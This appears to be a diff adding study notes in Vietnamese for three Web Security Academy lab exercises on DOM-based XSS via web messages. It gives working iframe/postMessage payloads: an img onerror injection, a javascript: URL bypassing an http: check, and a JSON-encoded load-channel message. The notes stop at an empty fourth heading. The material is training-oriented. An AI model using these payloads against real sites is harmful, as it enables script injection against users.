@@ -1,0 +1,60 @@
+1 : DOM XSS using web messages
+
+Tạo một postMessage ta thấy nội dung được truyền là innerHTML của 1 thẻ div, tiến hành XSS nội dung này thông qua img, lưu ý đổi dấu " sang mã hóa HTML để có thể XSS được
+
+<iframe src="//0ac5002b0442942dc106da0f0030008f.web-security-academy.net" onload="this.contentWindow.postMessage('<img src=&#x22;&#x22;onerror=&#x22;print()&#x22;>', '*')">
+
+(Đưa phần này vào body của exploit server và bấm deliver view to victim)
+
+2: DOM XSS using web messages and a JavaScript URL
+
+Khi kiểm tra web ta sẽ thấy có đoạn script check message như sau:
+
+window.addEventListener('message', function(e) {
+    var url = e.data;
+    if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+        location.href = url;
+    }
+}, false);
+                    
+Để bypass đoạn này rồi để url chạy ta cần cho nó vào phía sau của link để. 
+
+<iframe src="https://0abf0052037eb588c0b2367b002900c4.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+
+Cho phần này vào exploit server và deliver view to victim
+
+3: DOM XSS using web messages and JSON.parse
+
+Ở bài này, web sẽ tạo một iframe dựa trên json:
+
+ <script>
+    window.addEventListener('message', function(e) {
+        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+        document.body.appendChild(iframe);
+        try {
+            d = JSON.parse(e.data);
+        } catch(e) {
+            return;
+        }
+        switch(d.type) {
+            case "page-load":
+                ACMEplayer.element.scrollIntoView();
+                break;
+            case "load-channel":
+                ACMEplayer.element.src = d.url;
+                break;
+            case "player-height-changed":
+                ACMEplayer.element.style.width = d.width + "px";
+                ACMEplayer.element.style.height = d.height + "px";
+                break;
+        }
+    }, false);
+</script>
+
+Ta để ý thấy nếu "d.type" là "load-channel" thì iframe sẽ lấy src là "d.url" thực hiện truyền một json có dạng "load-channel" và url là "javascript:print()" :
+
+<iframe src="//0aa000c7049a9ea5c05ccc3800c40063.web-security-academy.net" onload="this.contentWindow.postMessage('{&#x22;type&#x22;:&#x22;load-channel&#x22;,&#x22;url&#x22;:&#x22;javascript:print()&#x22;}','*')" width="1900px" height="950px">
+
+Bấm deliver view to victim
+
+4:
